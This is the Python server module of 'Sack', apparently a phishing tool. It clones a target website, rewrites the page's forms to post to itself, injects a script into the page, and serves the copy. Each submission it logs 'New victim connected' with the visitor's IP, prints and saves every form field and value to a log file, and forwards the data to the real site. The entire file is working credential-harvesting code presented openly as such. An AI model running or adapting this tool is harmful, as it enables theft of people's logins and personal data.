#!/usr/bin/env python
# -*- coding: utf-8 -*-
#**
#
########
# Sack #
########
#
# Sack depends of this file
# For full copyright information this visit: https://github.com/jofpin/sack
#
# Copyright 2016 by Jose Pino <jofpin@gmail.com>
#**

from core.generals import generals
from core.framework import sack
from core.config import url
from core.config import urlAction
import SimpleHTTPServer
import SocketServer
import urllib2
import time
import cgi
import os
import sys
from socket import error as socerr
from bs4 import BeautifulSoup as bs

Framework = sack()

class serverHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    def do_POST(self):

        lastip = ""
        newIp = self.client_address[0]
        if lastip != newIp:
            Framework.shellLog("New victim connected" + ":" + " " + newIp)
        lastip = self.client_address

        # endpoint to show session state
        if self.path == '/not_logged':
            Framework.shellLog('User is not logged we can procced')
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            return

        # endpoint to show session state
        if self.path == '/logged':
            Framework.shellLog('User is logged we can not procced')
            self.send_response(200)
            self.send_header("Content-type","text/html")
            self.end_headers()
            return

        requestPost = []
        dateLogOne = time.strftime("%H:%M:%S")
        dateLogTwo = time.strftime("%H" + "%M" + "%S")

        generals.Go("")
        generals.Go(generals.Color["blueBold"] + "[*]" + " " + generals.Color["whiteBold"] + "Recent:" + " " + generals.Text["end"] + "request processed via " + generals.Color["greenBold"] + "POST" + generals.Color["white"])
        generals.Go("")
        form = cgi.FieldStorage(self.rfile,
            headers = self.headers,
            environ = {
            "REQUEST_METHOD": "POST",
            "CONTENT_TYPE": self.headers["Content-Type"]
            }
        )
        try:
            logFile = "%s" % dateLogTwo + ".log"
            path = os.getcwd() + "/logs/" + logFile
            registerLogs = open(path, "a")
            registerLogs.write("\n")
            registerLogs.write("#--------------------------------### History Log of Sack ###--------------------------------#")
            registerLogs.write("\n")
            registerLogs.write("\n")
            #registerLogs.write("# TARGET: %s" % url)
            #registerLogs.write("\n")
            #registerLogs.write("# PORT: %s" % port)
            #registerLogs.write("\n")
            registerLogs.write("# LOG: %s" % dateLogTwo)
            registerLogs.write("\n")
            registerLogs.write("# DATE: %s" % dateLogOne)
            registerLogs.write("\n")
            registerLogs.write("\n")
            registerLogs.write("\n")
            registerLogs.write("# Data obtained from the victim")
            registerLogs.write("\n")
            registerLogs.write("\n")
            registerLogs.write("New victim connected:" + " " + self.client_address[0])
            registerLogs.write("\n")
            registerLogs.write("\n")

            for doTag in form.list:
                temp = str(doTag).split("(")[1]
                nameKey, inputValue = temp.replace(")", "").replace("\'", "").replace(",", "").split()
                requestPost.append("%s %s" % (nameKey, inputValue))
                generals.Go(generals.Color["yellowBold"] + "+" + generals.Color["blue"] + "--" + generals.Color["whiteBold"] + "=" + " " + generals.Color["greenBold"] + "%s" % (nameKey) + generals.Color["white"] + " --" + generals.Color["whiteBold"] + ">" + " " + generals.Text["end"] + generals.Color["blue"] + "%s" % (inputValue))
                registerLogs.write("%s ---> %s" % (nameKey, inputValue) + "\n")
            registerLogs.close()

            Framework.generatePost(url, urlAction, requestPost)
            SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
        except socerr as error:
            generals.Go(generals.Color["redBold"] + "Error different: " + generals.Color["white"] + "something bad has last" + generals.Text("end") + " " + generals.Color["blue"] + "(%s)" % str(error))
        except Exception as error:
            generals.Go(generals.Color["redBold"] + "Error different: " + generals.Color["white"] + "something bad has last" + generals.Text("end") + " " + generals.Color["blue"] + "(%s)" % str(error))

    def log_message(self, format, *arguments):
        argument = format % arguments
        if argument.split()[1] == "/":
            generals.Go("")
            generals.Go(generals.Color["blueBold"] + "[*]" + " " + generals.Color["whiteBold"] + "Recent:" + " " + generals.Text["end"] + "request processed via " + generals.Color["greenBold"] + "GET" + generals.Color["white"] + " " + "(" + generals.Color["blue"] + "normal" + generals.Color["white"] + ")")
            generals.Go("")
        else:
            if argument.split()[1].startswith("/") and "&" in argument.split()[1]:
                generals.Go("")
                generals.Go(generals.Color["blueBold"] + "[*]" + " " + generals.Color["whiteBold"] + "Recent:" + " " + generals.Text["end"] + "request processed via " + generals.Color["greenBold"] + "GET" + generals.Color["white"] + " " + "(" + generals.Color["blue"] + "with parameters" + generals.Color["white"] + ")")
                generals.Go("")
                #generals.Go(generals.Color["yellowBold"] + "+" + generals.Color["blue"] + "--" + generals.Color["whiteBold"] + "=" + + generals.Color["whiteBold"] + " " + "Parameter:" + " " + generals.Color["white"] + "%s" % argument.split()[1])
                generals.Go(generals.Color["yellowBold"] + "+" + generals.Color["blue"] + "--" + generals.Color["whiteBold"] + "=" + " " + generals.Color["greenBold"] + "route and parameter" + generals.Color["white"] + " --" + generals.Color["whiteBold"] + ">" + " " + generals.Text["end"] + generals.Color["blue"] + "%s" % argument.split()[1])

class componentBase(object):
    def __init__(self, url, port):
        self.sackserver = None
        self.url = url
        self.port = port

    def request(self, url):
        opener = urllib2.build_opener()
        headers = [
              ("User-Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"),
              ("Content-Type", "text/html; charset=utf-8"),
              ("Accept", "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.8"),
              ("Connection", "keep-alive"),
              ("DNT", "1"), # Do Not Track (info here: https://www.w3.org/TR/tracking-dnt/)
              ("Keep-Alive", "115")
            ]
        opener.addheaders = headers
        return opener.open(self.url).read()

    # Files updater
    # Here are organized core files from the target. in this case (index.html)
    # The files are loaded and replaced values as (./ ../ /) with the main url of the target
    def updateContent(self):
        global fileRedirect
        fileRedirect = None
        if not fileRedirect:
            generals.Go(generals.Color["blueBold"] + "[*] " + generals.Color["white"] + "Updating files...")
            data = self.request(self.url)
        else:
            generals.GoTime(3, "Loading \'%s\' ..." % fileRedirect)
            data = open(fileRedirect, "r").read()

        # Beautiful HERE
        data = bs(data, "html.parser")
        generals.Go(generals.Color["blueBold"] + "[*] " + generals.Color["white"] + "The files were updated successfully.")

        for tagElement in data.find_all("form"):
            tagElement["method"] = "post"
            tagElement["action"] = "redirect.html"
        try:
            urlPath = self.url.rsplit("/", 1)[0]
            urisp = urlPath.split("/")[2]

            # Tag:a
            for tagElement in data.find_all("a"):
                link = tagElement["href"]
                if link.startswith("//"):
                    pass
                elif "://" in link:
                    pass
                elif "../" in link:
                    link = link.replace("../", "%s/" % uri)
                    tagElement["href"] = link
                elif link.startswith("/") and not urisp  in link:
                    tagElement["href"] = "%s%s" %(urlPath, link);
                elif not link.startswith("/") and not urisp in link:
                    tagElement["href"] = "%s/%s" %(urlPath, link);

            # Tag:link
            for tagElement in data.find_all("link"):
                link = tagElement["href"]
                if link.startswith("//"):
                    pass
                elif "://" in link:
                    pass
                elif "../" in link:
                    link = link.replace("../", "%s/" %uri)
                    tagElement["href"] = link
                elif link.startswith("/") and not urisp in link:
                    tagElement["href"] = "%s%s" %(uri, link);
                elif not link.startswith("/") and not urisp  in link:
                    tagElement["href"] = "%s/%s" %(uri, link);

            # Tag:img
            for tagElement in data.find_all("img"):
                link = tagElement["src"]
                if link.startswith("//"):
                    pass
                elif "://" in link:
                    pass
                elif "../" in link:
                    link = link.replace("../", "%s/" % uri)
                    tagElement["src"] = link
                elif link.startswith("/") and not urisp  in link:
                    tagElement["src"] = "%s%s" % (urlPath, link);
                elif not link.startswith("/") and not urisp in link:
                    tagElement["src"] = "%s/%s" % (urlPath, link);

        except IndexError:
            urlPath = self.url
            urisp = urlPath.replace("http://", "").replace("https://", "")
        except Exception as error:
            generals.Go(generals.Color["redBold"] + "Error different: " + generals.Color["white"] + "something bad has last" + generals.Text("end") + " " + generals.Color["blue"] + "(%s)" % str(error))
        #indexFile = "index.html"
        #pathIndex = os.getcwd() + "/data/" + indexFile

        with open("index.html", "w") as html:
            html.write(data.prettify().encode('utf-8').replace("</head>","<script src='/assets/app.js'></script></head>"))
            html.close()

    def run(self):
        try:
            generals.Go("")
            generals.Go("------------------------------------------------------------")
            generals.Go(generals.Color["greenBold"] + "[+] " + generals.Color["white"] + "Sack Web Server is running here:-->" + " " + generals.Color["cyan"] + generals.Text["underline"] + "http://0.0.0.0" + ":" + "%s" % (self.port) + generals.Text["end"])
            generals.Go("------------------------------------------------------------")
            self.sackserver = SocketServer.TCPServer(("", self.port), serverHandler)
            self.sackserver.serve_forever()
        except Exception as errorCase:
            generals.Go("")
            generals.Go(generals.Color["yellowBold"] + "Notice:" + " " + generals.Color["white"] + "Occurred a problem on the server. Perhaps the port that running is already in use, try again." + " " + generals.Color["blue"] + "(read the case below)")
            generals.Go(generals.Color["cyanBold"] + "Case:" + " " + generals.Color["white"] + "%s" % errorCase)
            generals.Go("")
